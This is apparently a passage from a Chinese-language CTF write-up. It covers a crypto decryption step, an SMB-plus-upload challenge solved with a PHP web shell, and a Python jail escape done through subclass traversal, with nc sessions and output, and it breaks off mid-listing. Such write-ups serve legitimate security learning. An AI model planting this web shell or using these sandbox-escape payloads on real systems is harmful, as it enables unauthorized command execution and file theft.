1998dddd07f65eaeea5f3ab6bbc33dce92179a4e140d7ebf0b06c412ee8b2636d90dd003721bd54c0d20bc5b071cce0a970625a28b0bf4aaf09c57fdb40bdeae24e3e20c5d0bfa0ab64fc627c6c633f93252460b8d8edcbfd6fd43a45dd1e3adc11733232686358dca0db03b23df9bde2d359695ab3e6af5ebe881c25ae5bc2be2a392551bc0f9a9c50e4b9306631f668c95479a11d267984e3cd407701d4d9b7c077804663b6b68e10030915023da5414df1905ce1e4b0ba7c4f677bcbdc89e778e7927ff4aa2a7699cc7447f433e4ba4072627f5e955735e6650cade1676410b2001cccd2d4146e0ee0671dbee364d34c4224d886e8704062c96e56f6e1e463f2f60a6267ee7e45d387b705beb765ee62898a52e6d9190f9079a2cc2c823c6a97a38750337fcb9c3b682ea60e0250c8f733ae1cd11de95a219cabe9db8e27db6ffc1af616ed7b8f27e8e748c5620291a9a850f24057fc1e0dbe6b6db49257c1c57cebed13ace5196af892ccc2b09b76f54048390bd5d06387ebddaefb2dca8b94c9d663cf2a6f4480c14f932c08667be1b7210181c4c8df0f1cea710cdb567fb2b1e126141bd1616436044f8722f81f7fe45ac67386ed806c471b782b6c288334b896803779e4b50a7280fec70e84c39303764b30f8d98d178968eae949192e1cdbbd378b186211cfd15d6e68cf9a85ea3873451d3f26ffce9d2f76e23cfca012687e17c78e214f22163f2a0b94ac7b3067b232ee7d6ab57e6991b668ad84d6602b5838a15566b5a407eea66ebd106a2fb67a367753e0bab7ffdc234a00c8ab0540f38379daa09f47c22cd3c96f2d3a13d17ddf2970aaec4f65029896fa549ba832f8bebebd2c00d895a568be4b8d093089fb0f5e9f9a4d37a7ed5ace03268b236d33ae36b8168633de6178de56a1053df6a9b1d902df020ecaed6612aba8dd03dee1ea0a00467f9dcb98cfbc742e352d6315dc479216f08765b7341a085ac313c2b8856d22cd822ba6fd1a62519ae1cfec489e678e0440a1aeacbcb917aed893c0255618569ba9c03e627d0ce7ecd33ce64e26b9ff4ed9fc3f6f87dc105f4962373d86f155b64273b4a14cad88bc07265b78ba3b8e87b7b5dde2d39349658a295295c253495004a9a6c7d8ec46414f6c74bff4179784ad19dac1f5897bb56c1716f7cc238024d1243399329843cc8cbc1ec15dc69f089c43f3c6545cd35d1d176c3bbc5c6ea5475fcc9b7411d96febbb4fef67124897a4ab311ec2f32ae590065f3e4f76b716479d9506e6a03a151ba6258e31eda4feee96d3e255c74c874e197de71156ad5b1df35ce20a60033714689bd409b1b35aafa3b3cda73d7524321c7562f7dad33e22cc9ea6cea4d3933a9ef1924ff0add9a441647bbeaa8a13e680281956abba2231ad39778c3bb92cea57b93ec063b676fc8d0ce898a1856449c1b1b16d7973ba40c5aa52edb1dc7e2332fcf61217cd02e31b0c5c787089771acb3e8c2b7715911e09cd9183e803d80c9873074026c3e4ecfe11600b2e507e159a56e0394f1b42618aaf7363523a4c8b53c497fecdc65d167bdb2c4f79ee393387e364954debe37f1a933b964af9ac3e3227a77a167f3491e61eb43a67bb7a13c6b113ebeb0784dd5e70422ca27eebc2e703fc2c7996375c9b4d4f3aa44b6ab4f8e08f6cc8263e0229a12582f2c2301d1650d2a2f1146f87a59a34178b54a58fd46ca725267bb2f4a19fbac7b53b6f6aa1d70bb46674b5879d6ed81f40f01c62634d1ba6dee627d75e4f1333e2805e00f142860193e278ec1d676cc25c3ae91237ab9209b26a304b2e65b7bb6a68fbc300d8114f14adafe8cff69d554de4d8ba4e321f94b3d90bf9feeeeadd1bbdffde39c7036c70ffc340b0f9f8d819e925ecac8feca4a6c4aa9918477e742a0d104c0972ef02082fa9365d49654b29306c131d36eccb0e393f186553e08217f69a6191b1d4017ab431e45cbb8a4511e4cd6fa183c6f7e5612bfe8c3ae2b10e97c530ae172ebcb201585b05c1aedbed2daea99026596486063b620db4a75a72ece20683abb3e53d2a067785e8fa396d0f02233bd8221d1e7620af36a5e9c98d4e3f4eaef09794dde1ecea87dd531f276da98a3112665ced8610937f1b8d6cf0dde32de980fe1ee43bf856f3fc8b34035f5345d80b2c123a4ea7b24da20a065a08e9be1b5808b18727b689cd376d620d28566e9d7f7507e1b7705bd0fccd631891f297ff44990c2b1c697e9582531025e7556824e89db58672e0bf91fe7aad4e5d6d733cace0d92a5089fff9c6e7a4a56c857934143e6296950a0dc3e3a4cfcb479c4c2f18d52d1a67aa260f421a5f657b371faffada38099edbf07b7799e2424ae24a9ad2b76bb5e75453b5b3c4270f0be1448d3fda6660d77ec8e569d6c21f532d8871b9e5d60ac6a1b80b688c6efe12678e8cedd7b3ef19658ccf13f554c92fbd37d3773e57d8fd79c9f21783495a9d534efdd8f99a6d27ea40d76d032bc8f999ece9a55f292fb80111d526d1a0a8b33f4e35ea820cd4dfc8a526ead8baad66f5b2d86404de48d97a8a4d6b7f50eccc1350a60a23a4f3d479473ed1825f373b78003080af07f99ac6ead34124a5d43cef23c2e548779993c73c7cd5e89624dfa3952251b8e86eb9d4bce88244c60b0b0765379054f532fddff5e6a4da75d38ab7f67f8bede89c812259f948e4371d82e2b838e62250475e7986e97ad9706d84a57560934d9cd566cc5fba0f4f7037554ad926e68f178323881f33aba7a6811a03f3f507b6494428f3428927bd120b73298b2f5cad421985b0af070b9fae7037ea3cef1885d3846ba8cd09cd9f43070096a249796bcdd21ca55c76816ead0692e0587d96f831f343dde19117083509e0d4f5b296674dcc0e17b669f7c2ab4b0a609d6cbed8073d1aec3ef2cee0aad9c055d54ac11d58c01ab27956b3bbd667f5bb52dc96b647fc9ee2dc47ae8e5bab66d1bbf66d21926e063a90d7438e501113e78e9506c20c0dcc517189d5f54a6b4d53bff8173adbb3c2c4017e440f05517fa56c424d03b2e8dd81537a714cb53c3ec1c8237344d3ce8a0e8f81cb5693908f0cf63001cb0f2218a53b9be92f4c1aed51ba9a224523ae765a71ad3ba687594496ec72887a8f3a6f6338fab6c14ed6c139d687f5de68f99a2b4b425774abe7ad24995d775b8ac11efbc6ef0b38f6377c969ed6e63919f510c5444347155903c72be2f82de608b3abaec12a084c7a3cf06b6be7bef4478c723b90c5b652b1a87b206a2f1405a89471a4b9a073f3204a158e20a5e3dc6c4f433360927dce3b58ca65b3c42d18bf860a977ffc469cca122c8dfd338cdaffa4d796e4ee0314f581b0683763d6b9c0cf6498fad28fd4506258023553ef4d66f7e389014ca9a0e38627910a816cd51c95ff5a269080cc08ff96fd035efd2a0c192d58e09bc3d864c165c90da82bd2e61617132b9f62861c176d11a56d335589c534cdfc7312de0da2b845a863e35293eb60341328df60fcb9927115e7f24e6fe0a2bef5bbbaf560b13d58c93a3878bc99d44b5e748692b231ad3c84187776e29905979a7470424b1df92ea82374efad63da2a1c41aaf4c1e446416eaac450f659ce12012d7a22f3c8d97848356ded7504b448a9595683f2be12fd23c4fbdaaded9a3207031077272f64428e9e202d03a2083c7e68807ac9eda25130deb4347a8c2ae36a211a8324218da4276c1b5566b0bb7bd70ccfb580bce3ee108915bc1b21ad49de03875bd0346752e8a1c6788fd829a74abf7b01a3329f9bd7a2535c312f5a48b20623646e1078b6d4f5df9c0cc0bc06d41deb208b31cbe4b49e8dcf697bc7439d00a0c87bb64be44115b440d6b0fcf38e024bc332290b4ca33d1fa097799cae6cbf297b68a87ff8ba687ef4a5dbb25e02e7f95ea2bfb34db25ccb38df96f1bb32372ff00e5f3d78c0ce5a1bde27d2af89bb11efdf4b1b11feaf8c36b3373c0867b3fecbe58150a88758873ae4ecd3df4da6549732245da3cebd152a3dbef070aacd7f0c760fc797c253f9375edee15ec7f783059818df5ec0632c10e50f8dce4fbd4ddcff61c9601a88925db83dfe1b6a4bbdf76506828a1ece4ee99c1e356b686b880aaaf1f789d0b8e1a5ef69b7c12d57161bbab80219d270ab65ce6b1d29bcc24a6bedc18ac73783a2271560ec5193b20979c2168a0da1da6a30d9f7190973ac11906de52f80db4d40b5a86c1084ad17115718b7c9327dcd1aaf266df16f0f232ed926b2d7f139c37ad527a01ef38bcb3dfae204ebafda14ecac741ef1769c2f02189c2c474cb3b9f79884a767baad126a5a14c99e2fc6a1f1c0d3c1598f5670ce19aa0d01c6a7302d4e66d28315139f9b20f474ae1a39b93bb18a479733db8bf9dd737f8a09d4146ad89850342445eee2ca3141a672047814e42b7b9bd7798d6d8d82adba9d696dce955e61815520618a1ec70a9264acd244a5d8f5170f3a0ece58351737c31a617d3e646916e503cd7b20c6decafe3a8532f6bde5e89b7b8314a73dcf9c75090331d7f56820637c2d9ace9a75d8cef4a5f45049a8d17ecddd1c1e7f2683588cf834e82044e38e571ef786c9b1ff1ab9dd40644784f2820a42a9c1ecbe155d54557bd34c2c8245fe9f6187fa97c46929dffcf2b0d49679a51a2cd069879174b7d1556c83e2aaecf0e9a7fa52af3b3f0d6dbe95474da464c065db054521f17e0cf676060acb4c64fb7f9d42ad518a27ebcbdeb9e1183ac02c182e19fe98948be6ca6b44b8936294234c0c795bebf6726bb9f6d71029b7226a7f2d920d7c6d5bad845dbd7126be045ff9f2553f617591e0aad0979e2194b4ca5d0624cbe141c4a3e36d218f58ad3675412d29917ea1e91ee05b7a52267534b2386ecfa2f9634214ae42511dadd68f75422fd87d99309f38ecb97ece0ea084d5f11c15b6059a5c161881bf421a143a8e400bb41b9c42af3943cc3308523717d2684e605c19f4f61b02b1d437f8ea2ff31c478b820c503a847c07ec5a11f84ebddb13976db04fef81ad11c1917ac48ba5dfec46f7e5ccd1743b56d837acbe81dd60fdd8e65e6d7bffa03aeb6b4c5af715dcbe48dfa54f5802627f05736521096b6755103aac95d1dbe803eb15e200180e557d5238e9a5d06a2f9d1573bc4d302739050c2da989309fa060bf31f233d118fe4673491af97c6504774db6b08d5772f718460f99b2b2fcd0b455ca4d119a42a982d22e1d0931736d26740b8bd0930d0b673300b8d602fa230ebbb56a599aaf341382072d843fb8850ba41b18ce628687388f32e896fbb01387ded3099aa1f567093f69dcd08d5822ed345453efab20c3a5ba059c19fd3c8c660776ca1ab858433e83ddd6fccca3df9ee20d1634b60a284f7497bd40f58eb2f58ffb4530cc3ad9024132ca7f45f69426f1e1cba8b8a811cf8971c94352ee445d1e37e4157b406864de23e44c2698e6be5737bc4e8dafa303e8c4b6b800fbed343b9a8867633040c0ab8c80e5ab12e22966e4125e760dfcd34d217a4703d6743d24ce97469b120d57cb3e9b19100f90dd794ccb9ee86feec5a48b08de98799d99f9e"  # 題目給的密文 hex
cipher_int = int(cipher_hex, 16)

# 嘗試第一組 (21701, 23209)
plaintext1 = decrypt_cipher(cipher_int, 21701, 23209)
print("Try (21701, 23209) =>", plaintext1)

# 如果不對，再試第二組 (23209, 21701)
plaintext2 = decrypt_cipher(cipher_int, 23209, 21701)
print("Try (23209, 21701) =>", plaintext2)

```

![image](https://hackmd.io/_uploads/BypFseUwJl.png)
執行結果的尾巴就可以看到flag出現

## MISC

### A_BIG_BUG

> 題目有提示要回頭看
> 第一行有寫到連線smb的帳號ctfuser
> 密碼我是一個一個慢慢試，最後發現“pass”剛好可以過

接著開始寫php檔丟到他的upload裡面

```
<?php
// filename: simple_cmd.php

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Usage: ?cmd=命令";
}
?>
```

就可以開始進到我們的目標網站/upload下做一些壞壞的事（？

```
http://172.31.0.2:30164/uploads/simple_cmd.php?cmd=ls%20-la%20/
得到的結果

total 72
drwxr-xr-x    1 root root 4096 Jan 14 10:40 .
drwxr-xr-x    1 root root 4096 Jan 14 10:40 ..
-rwxr-xr-x    1 root root    0 Jan 14 10:40 .dockerenv
lrwxrwxrwx    1 root root    7 Oct 11 02:03 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    5 root root  340 Jan 14 10:40 dev
drwxr-xr-x    1 root root 4096 Jan 14 10:40 etc
drwxr-xr-x    2 root root 4096 Apr 15  2020 home
lrwxrwxrwx    1 root root    7 Oct 11 02:03 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Oct 11 02:03 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Oct 11 02:03 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Oct 11 02:03 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Oct 11 02:03 media
drwxr-xr-x    2 root root 4096 Oct 11 02:03 mnt
drwxr-xr-x    2 root root 4096 Oct 11 02:03 opt
dr-xr-xr-x 2214 root root    0 Jan 14 10:40 proc
drwx------    2 root root 4096 Oct 11 02:09 root
drwxr-xr-x    1 root root 4096 Jan  6 14:58 run
lrwxrwxrwx    1 root root    8 Oct 11 02:03 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Oct 11 02:03 srv
-rwxr-xr-x    1 root root  762 Jan  5 13:31 start.sh
dr-xr-xr-x   13 root root    0 Jan 14 10:40 sys
drwxrwxrwt    1 root root 4096 Jan 14 10:40 tmp
drwxr-xr-x    1 root root 4096 Oct 11 02:03 usr
drwxr-xr-x    1 root root 4096 Jan  6 14:58 var
```

```
http://172.31.0.2:30164/uploads/simple_cmd.php?cmd=find%20/%20-name%20*flag*%202%3E%2Fdev%2Fnull
快速看一下哪邊有出現flag字眼的檔案
```

```
http://172.31.0.2:30166/uploads/simple_cmd.php?cmd=ls%20-la%20/tmp

輸出的結果
total 12
drwxrwxrwt 1 root root 4096 Jan 14 10:50 .
drwxr-xr-x 1 root root 4096 Jan 14 10:50 ..
-rw-r--r-- 1 root root   82 Jan 14 10:50 flag.txt
```

```
http://172.31.0.2:30166/uploads/simple_cmd.php?cmd=cat%20/tmp/flag.txt
得到flag
```

### BabyJail

> 其實我是一個一個慢慢去試看能不能繞過
> 所以這邊貼我試過的所有可能性

第一組（沒什麼進展 但總之至少有看到class了）

```
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'TextIOWrapper'][0]("/flag.txt").read()
Traceback (most recent call last):
  File "/home/pyjail/jail.py", line 3, in <module>
    print(eval(input('> '), {"__builtins__": {}}, {}))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
IndexError: list index out of range
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'TextIOWrapper'][0]("/flag.txt").read()
Traceback (most recent call last):
  File "/home/pyjail/jail.py", line 3, in <module>
    print(eval(input('> '), {"__builtins__": {}}, {}))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
IndexError: list index out of range
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls.__name__ for cls in ().__class__.__base__.__subclasses__()]
['type', 'async_generator', 'bytearray_iterator', 'bytearray', 'bytes_iterator', 'bytes', 'builtin_function_or_method', 'callable_iterator', 'PyCapsule', 'cell', 'classmethod_descriptor', 'classmethod', 'code', 'complex', 'Token', 'ContextVar', 'Context', 'coroutine', 'dict_items', 'dict_itemiterator', 'dict_keyiterator', 'dict_valueiterator', 'dict_keys', 'mappingproxy', 'dict_reverseitemiterator', 'dict_reversekeyiterator', 'dict_reversevalueiterator', 'dict_values', 'dict', 'ellipsis', 'enumerate', 'filter', 'float', 'frame', 'frozenset', 'function', 'generator', 'getset_descriptor', 'instancemethod', 'list_iterator', 'list_reverseiterator', 'list', 'longrange_iterator', 'int', 'map', 'member_descriptor', 'memoryview', 'method_descriptor', 'method', 'moduledef', 'module', 'odict_iterator', 'PickleBuffer', 'property', 'range_iterator', 'range', 'reversed', 'symtable entry', 'iterator', 'set_iterator', 'set', 'slice', 'staticmethod', 'stderrprinter', 'super', 'traceback', 'tuple_iterator', 'tuple', 'str_iterator', 'str', 'wrapper_descriptor', 'zip', 'GenericAlias', 'anext_awaitable', 'async_generator_asend', 'async_generator_athrow', 'async_generator_wrapped_value', '_buffer_wrapper', 'MISSING', 'coroutine_wrapper', 'generic_alias_iterator', 'items', 'keys', 'values', 'hamt_array_node', 'hamt_bitmap_node', 'hamt_collision_node', 'hamt', 'legacy_event_handler', 'InterpreterID', 'line_iterator', 'managedbuffer', 'memory_iterator', 'method-wrapper', 'SimpleNamespace', 'NoneType', 'NotImplementedType', 'positions_iterator', 'str_ascii_iterator', 'UnionType', 'CallableProxyType', 'ProxyType', 'ReferenceType', 'TypeAliasType', 'Generic', 'TypeVar', 'TypeVarTuple', 'ParamSpec', 'ParamSpecArgs', 'ParamSpecKwargs', 'EncodingMap', 'fieldnameiterator', 'formatteriterator', 'BaseException', '_WeakValueDictionary', '_BlockingOnManager', '_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'BuiltinImporter', 'FrozenImporter', '_ImportLockContext', 'lock', 'RLock', '_localdummy', '_local', 'IncrementalNewlineDecoder', '_BytesIOBuffer', '_IOBase', 'ScandirIterator', 'DirEntry', 'WindowsRegistryFinder', '_LoaderBasics', 'FileLoader', '_NamespacePath', 'NamespaceLoader', 'PathFinder', 'FileFinder', 'AST', 'Codec', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_abc_data', 'ABC', 'Hashable', 'Awaitable', 'AsyncIterable', 'Iterable', 'Sized', 'Container', 'Buffer', 'Callable', '_wrap_close', 'Quitter', '_Printer', '_Helper']
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ 
```

第二組（沒什麼進展）

```
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader'][0]
<class '_frozen_importlib_external.FileLoader'>
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader'][0]('foo', '/flag.txt')
<_frozen_importlib_external.FileLoader object at 0x7f5f5c5331d0>
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader'][0]('foo', '/flag.txt').get_data('/flag.txt').decode()
Traceback (most recent call last):
  File "/home/pyjail/jail.py", line 3, in <module>
    print(eval(input('> '), {"__builtins__": {}}, {}))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
  File "<frozen importlib._bootstrap_external>", line 1189, in get_data
FileNotFoundError: [Errno 2] No such file or directory: '/flag.txt'
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls.__name__ for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'FileLoader']
['FileLoader']
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ 
```

第三組

```
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os')
<module 'os' from '/usr/local/lib/python3.12/os.py'>
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').open('flag.txt', 'r').read()
Traceback (most recent call last):
  File "/home/pyjail/jail.py", line 3, in <module>
    print(eval(input('> '), {"__builtins__": {}}, {}))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
TypeError: 'str' object cannot be interpreted as an integer
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> __import__('os').system('cat ./flag.txt')
Traceback (most recent call last):
  File "/home/pyjail/jail.py", line 3, in <module>
    print(eval(input('> '), {"__builtins__": {}}, {}))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> _\u200b_import\u200b_os\u200b.system\u200b('cat flag.txt')
Traceback (most recent call last):
  File "/home/pyjail/jail.py", line 3, in <module>
    print(eval(input('> '), {"__builtins__": {}}, {}))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1
    _\u200b_import\u200b_os\u200b.system\u200b('cat flag.txt')
      ^
SyntaxError: unexpected character after line continuation character
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home/pyjail/')
['.bashrc', '.profile', '.bash_logout', 'jail.py', 'run.sh']
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home/pyjail/')
['.bashrc', '.profile', '.bash_logout', 'jail.py', 'run.sh']
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home/pyjail/data/')^[[   
Traceback (most recent call last):
  File "/home/pyjail/jail.py", line 3, in <module>
    print(eval(input('> '), {"__builtins__": {}}, {}))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1
    [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir(
                                                                                                                                               ^
SyntaxError: '(' was never closed
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/home')
['pyjail']
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/')
['tmp', 'sbin', 'run', 'dev', 'boot', 'root', 'proc', 'media', 'lib', 'var', 'home', 'mnt', 'srv', 'etc', 'usr', 'bin', 'lib64', 'sys', 'opt', '.dockerenv', 'flag_LwAyYvKd']
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/root')
Traceback (most recent call last):
  File "/home/pyjail/jail.py", line 3, in <module>
    print(eval(input('> '), {"__builtins__": {}}, {}))
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
PermissionError: [Errno 13] Permission denied: '/root'
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/tmp')
[]
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/usr')
['sbin', 'local', 'src', 'libexec', 'include', 'lib', 'bin', 'games', 'share']
                                                                                                                                                                    
┌──(parallels㉿kali-linux-2024-2)-[~/Documents/2025TSCCTF]
└─$ nc 172.31.3.2 8002
> [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == 'PathFinder'][0].find_spec('os').loader.load_module('os').listdir('/usr/bin')
['cmp', 'toe', 'getconf', 'nsenter', 'sum', 'i386', 'basename', 'prlimit', 'linux32', 'passwd', 'scriptreplay', 'realpath', 'gpasswd', 'ldd', 'setarch', 'sha384sum', 'dpkg-split', 'shuf', 'ipcrm', 'apt-cdrom', 'zdump', 'deb-systemd-helper', 'which', 'nohup', 'tr', 'unlink', 'newgrp', 'env', 'dpkg-realpath', 'diff', 'debconf', 'join', 'tabs', 'mcookie', 'pinky', 'who', 'expr', 'reset', 'fincore', 'clear', 'awk', 'debconf-show', 'scriptlive', 'wc', 'flock', 'localedef', 'pathchk', 'lsmem', 'apt-config', 'apt-key', 'perl5.32.1', 'logger', 'namei', 'lslogins', 'getopt', 'bashbug', 'nice', 'numfmt', 'unexpand', 'setterm', 'base32', 'pager', 'tic', 'rev', 'head', 'dpkg', 'lastlog', 'chsh', 'clear_console', 'printf', 'gpgv', 'dirname', 'x86_64', 'chattr', 'unshare', 'setpriv', 'du', 'chcon', 'install', 'hostid', 'cut', 'tail', 'yes', 'cksum', 'dpkg-deb', 'addpart', 'update-alternatives', 'expand', 'lsns', 'mkfifo', 'dpkg-trigger', 'chage', 'setsid', 'fallocate', 'ptx', 'faillog', 'dpkg-query', 'infocmp', 'printenv', 'ipcs', 'uniq', 'tac', 'split', 'whereis', 'fold', 'debconf-escape', 'pr', 'sort', 'utmpdump', 'apt-mark', 'apt-cache', 'b2sum', 'stat', 'sdiff', 'nawk', 'perl', 'renice', 'nl', 'xargs', 'sha1sum', 'delpart', 'logname', 'nproc', 'catchsegv', '[', 'lsipc', 'sha224sum', 'md5sum', 'resizepart', 'deb-systemd-invoke', 'wall', 'comm', 'taskset', 'runcon', 'stdbuf', 'diff3', 'timeout', 'captoinfo', 'iconv', 'debconf-communicate', 'sha256sum', 'tee', 'users', 'shred', 'id', 'script', 'tset', 'find', 'savelog', 'locale', 'tzselect', 'csplit', 'tty', 'getent', 'seq', 'rgrep', 'factor', 'ischroot', 'sg', 'sha512sum', 'last', 'base64', 'dircolors', 'dpkg-maintscript-helper', 'link', 'ipcmk', 'partx', 'choom', 'chfn', 'pldd', 'dpkg-statoverride', 'fmt', 'md5sum.textutils', 'arch', 'apt-get', 'touch', 'whoami', 'lsattr', 'debconf-copydb', 'debconf-apt-progress', 'chrt', 'mesg', 'mawk', 'od', 'infotocap', 'test', 'truncate', 'ionice', 'paste', 'basenc', 'tsort', 'lastb', 'tput', 'dpkg-divert', 'linux64', 'debconf-set-selections', 'apt', 'expiry', 'lslocks', 'groups', 'lscpu', 'xconv.pl', 'dotlock', 'frm', 'movemail.mailutils', 'pstree', 'killall', 'frm.mailutils', 'itox', 'crontab', 'decodemail', 'mail.mailutils', 'from', 'mailq', 'sieve', 'movemail', 'readmsg', 'pslog', 'from.mailutils', 'messages.mailutils', 'readmsg.mailutils', 'messages', 'peekfd', 'mailx', 'dotlock.mailutils', 'pstree.x11', 'mail', 'mimeview', 'prtstat', 'newaliases', 'tcltk-depends', 'wish8.6', 'wish', 'tclsh8.6', 'tclsh', 'ncurses5-config', 'c++filt', 'x86_64-linux-gnu-gcc-ar-10', 'dpkg-shlibdeps', 'x86_64-linux-gnu-cpp-10', 'funzip', 'lzma', 'lzmainfo', 'dpkg-checkbuilddeps', 'nm', 'make', 'x86_64-linux-gnu-ld.gold', 'libwmf-config', 'glib-gettextize', 'x86_64-linux-gnu-dwp', 'automake-1.16', 'patch', 'dpkg-vendor', 'x86_64-linux-gnu-objcopy', 'elfedit', 'automake', 'unzip', 'c++', 'gencfu', 'x86_64-linux-gnu-readelf', 'x86_64-linux-gnu-gcov-dump-10', 'derb', 'dh_autotools-dev_restoreconfig', 'c99-gcc', 'identify-im6', 'c99', 'montage-im6', 'zipinfo', 'krb5-config.mit', 'x86_64-linux-gnu-strip', 'gcov-dump', 'fc-match', 'gcov', 'unzipsfx', 'fc-scan', 'dwp', 'ar', 'xml2-config', 'ld.bfd', 'autoreconf', 'animate', 'conjure-im6', 'mogrify', 'gio-querymodules', 'update-mime-database', 'size', 'dpkg-genchanges', 'gcc-ranlib', 'gapplication', 'fc-conflist', 'import-im6.q16', 'ncursesw5-config', 'pkgdata', 'objcopy', 'x86_64-linux-gnu-ranlib', 'gcc-nm-10', 'x86_64-linux-gnu-lto-dump-10', 'gdk-pixbuf-csource', 'makeconv', 'x86_64-linux-gnu-c++filt', 'ncurses6-config', 'import', 'unlzma', 'gcov-dump-10', 'fc-pattern', 'mogrify-im6', 'x86_64-linux-gnu-gcc', 'x86_64-linux-gnu-gcc-ranlib', 'x86_64-linux-gnu-gcc-ar', 'lzegrep', 'xzfgrep', 'conjure-im6.q16', 'c89-gcc', 'composite-im6', 'x86_64-linux-gnu-elfedit', 'fc-cat', 'x86_64-linux-gnu-gcov-tool-10', 'stream', 'compare-im6', 'gcc-ar-10', 'readelf', 'x86_64-linux-gnu-gcc-nm', 